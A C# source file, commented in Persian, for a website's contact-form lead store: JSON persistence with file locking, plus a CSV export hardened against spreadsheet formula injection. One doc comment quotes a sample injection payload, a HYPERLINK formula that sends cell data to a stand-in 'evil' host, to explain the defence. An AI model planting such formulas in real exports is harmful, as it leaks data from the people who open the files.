using System.Globalization;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Up2Ai.Services;

public sealed class Lead
{
    [JsonPropertyName("id")] public string Id { get; set; } = "";
    [JsonPropertyName("at")] public string At { get; set; } = "";     // ISO timestamp
    [JsonPropertyName("name")] public string Name { get; set; } = "";
    [JsonPropertyName("reach")] public string Reach { get; set; } = "";
    [JsonPropertyName("business")] public string Business { get; set; } = "";
    [JsonPropertyName("service")] public string Service { get; set; } = "";
    [JsonPropertyName("need")] public string Need { get; set; } = "";
    [JsonPropertyName("handled")] public bool Handled { get; set; }
}

/// <summary>
/// صندوق لید.
///
/// هر ارسالِ فرم تماس همین‌جا ذخیره می‌شود — صرف‌نظر از این‌که واتساپ/ایمیل پر
/// شده باشد یا نه — تا هیچ لیدی بی‌سروصدا گم نشود. یک فایل JSON ساده است، نه
/// پایگاه‌داده: حجم واقعی (چند ده لید در ماه) توجیه‌کننده‌ی پایگاه‌داده نیست.
///
/// ┌────────────────────────────────────────────────────────────────────────┐
/// │ تفاوت مهم با نسخه‌ی Node: آن‌جا یک «صف درون‌فرآیندی» کافی بود، چون همه‌ی │
/// │ درخواست‌ها در یک پردازه‌ی واحد اجرا می‌شدند. این‌جا ASP.NET درخواست‌ها را │
/// │ هم‌زمان و چندنخی اجرا می‌کند و ممکن است چند نمونه از برنامه هم بالا     │
/// │ باشد، پس قفل واقعیِ فایل لازم است — نه قفل درون‌حافظه‌ای.                │
/// │ این‌جا هر دو گذاشته شده: یک قفل نخی برای داخل همین پردازه، و یک قفل     │
/// │ روی خود فایل (FileShare.None با تلاش مجدد) برای بین پردازه‌ها.          │
/// └────────────────────────────────────────────────────────────────────────┘
/// </summary>
public sealed class LeadStore
{
    private static readonly SemaphoreSlim Gate = new(1, 1);
    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        WriteIndented = true,
        Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping,
    };

    private readonly string _dataDir;
    private readonly ILogger<LeadStore> _log;

    public LeadStore(IWebHostEnvironment env, IConfiguration config, ILogger<LeadStore> log)
    {
        _log = log;
        _dataDir = config["UP2AI_DATA_DIR"] ?? Path.Combine(env.ContentRootPath, "data");
    }

    private string File_ => Path.Combine(_dataDir, "leads.json");

    private List<Lead> ReadAllUnlocked()
    {
        try
        {
            if (!File.Exists(File_)) return new List<Lead>();
            var raw = File.ReadAllText(File_);
            var parsed = JsonSerializer.Deserialize<List<Lead>>(raw);
            if (parsed is null) return new List<Lead>();
            // هر رکورد جدا اعتبارسنجی می‌شود — یک خط خراب نباید کل فایل را بی‌اثر کند.
            return parsed.Where(IsValid).ToList();
        }
        catch (Exception ex)
        {
            _log.LogError(ex, "[leads] فایل لیدها خوانده نشد");
            return new List<Lead>();
        }
    }

    private static bool IsValid(Lead? l) =>
        l is not null && l.Id.Length > 0 && l.At.Length > 0 && l.Name.Length > 0;

    private void WriteAllUnlocked(List<Lead> leads)
    {
        Directory.CreateDirectory(_dataDir);
        var tmp = $"{File_}.{Environment.ProcessId}.tmp";
        File.WriteAllText(tmp, JsonSerializer.Serialize(leads, JsonOpts));
        File.Move(tmp, File_, overwrite: true);
    }

    /// <summary>
    /// قفل بین‌پردازه‌ای: یک فایل قفل جدا باز می‌شود با FileShare.None. اگر
    /// پردازه‌ی دیگری آن را گرفته باشد، کمی صبر و دوباره تلاش می‌کنیم.
    /// </summary>
    private async Task<T> WithLockAsync<T>(Func<T> body)
    {
        await Gate.WaitAsync();
        try
        {
            Directory.CreateDirectory(_dataDir);
            var lockPath = Path.Combine(_dataDir, ".leads.lock");
            for (var attempt = 0; attempt < 50; attempt++)
            {
                try
                {
                    using var handle = new FileStream(
                        lockPath, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None);
                    return body();
                }
                catch (IOException)
                {
                    await Task.Delay(20);
                }
            }
            // بعد از یک ثانیه تلاش، بدون قفل ادامه می‌دهیم تا درخواست کاربر گم
            // نشود؛ قفل نخی داخل همین پردازه هنوز برقرار است.
            _log.LogWarning("[leads] قفل فایل گرفته نشد، بدون قفل بین‌پردازه‌ای ادامه داده شد");
            return body();
        }
        finally
        {
            Gate.Release();
        }
    }

    public Task<Lead> AddAsync(string name, string reach, string business, string service, string need) =>
        WithLockAsync(() =>
        {
            var leads = ReadAllUnlocked();
            var lead = new Lead
            {
                Id = Guid.NewGuid().ToString(),
                At = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ", CultureInfo.InvariantCulture),
                Handled = false,
                Name = name,
                Reach = reach,
                Business = business,
                Service = service,
                Need = need,
            };
            leads.Add(lead);
            WriteAllUnlocked(leads);
            return lead;
        });

    /// <summary>تازه‌ترین بالا.</summary>
    public List<Lead> List() =>
        ReadAllUnlocked()
            .OrderByDescending(l => l.At, StringComparer.Ordinal)
            .ToList();

    public Task<bool> SetHandledAsync(string id, bool handled) =>
        WithLockAsync(() =>
        {
            var leads = ReadAllUnlocked();
            var lead = leads.FirstOrDefault(l => l.Id == id);
            if (lead is null) return false;
            lead.Handled = handled;
            WriteAllUnlocked(leads);
            return true;
        });

    public Task<bool> DeleteAsync(string id) =>
        WithLockAsync(() =>
        {
            var leads = ReadAllUnlocked();
            var next = leads.Where(l => l.Id != id).ToList();
            if (next.Count == leads.Count) return false;
            WriteAllUnlocked(next);
            return true;
        });

    /// <summary>
    /// خروجی CSV — با BOM تا اکسل فارسی را درست نشان بدهد.
    ///
    /// نکته‌ی امنیتی: محتوای این فایل را *بازدیدکننده‌ها* می‌نویسند (فرم تماس
    /// عمومی است) و بعد مدیر آن را در اکسل باز می‌کند. اکسل هر سلولی را که با
    /// = یا + یا - یا @@ شروع شود «فرمول» می‌فهمد و اجرا می‌کند — حتی وقتی
    /// سلول داخل گیومه باشد. یعنی یک نفر می‌توانست در فیلد نام
    /// `=HYPERLINK("http://evil/"&amp;A1,"باز کن")` بنویسد و روی کامپیوترِ
    /// مدیر اجرا شود. راه‌حل استاندارد (توصیه‌ی OWASP): یک آپاستروف پیش از
    /// این کاراکترها که اکسل آن را «این سلول متن است» می‌فهمد و نمایش هم
    /// نمی‌دهد.
    /// </summary>
    public static string ToCsv(IEnumerable<Lead> leads)
    {
        var fa = new CultureInfo("fa-IR");

        string Esc(string s)
        {
            var v = s ?? "";
            if (v.Length > 0 && (v[0] is '=' or '+' or '-' or '@' or '\t' or '\r'))
                v = "'" + v;
            return "\"" + v.Replace("\"", "\"\"") + "\"";
        }

        var headers = new[] { "تاریخ", "نام", "راه ارتباطی", "کسب‌وکار", "حوزه", "نیاز", "پیگیری شد" };
        var lines = new List<string> { string.Join(",", headers.Select(Esc)) };

        foreach (var l in leads)
        {
            var when = DateTime.TryParse(l.At, CultureInfo.InvariantCulture,
                DateTimeStyles.RoundtripKind, out var dt)
                ? dt.ToLocalTime().ToString(fa)
                : l.At;
            lines.Add(string.Join(",", new[]
            {
                when, l.Name, l.Reach, l.Business, l.Service, l.Need, l.Handled ? "بله" : "خیر",
            }.Select(Esc)));
        }

        return "﻿" + string.Join("\r\n", lines);
    }
}
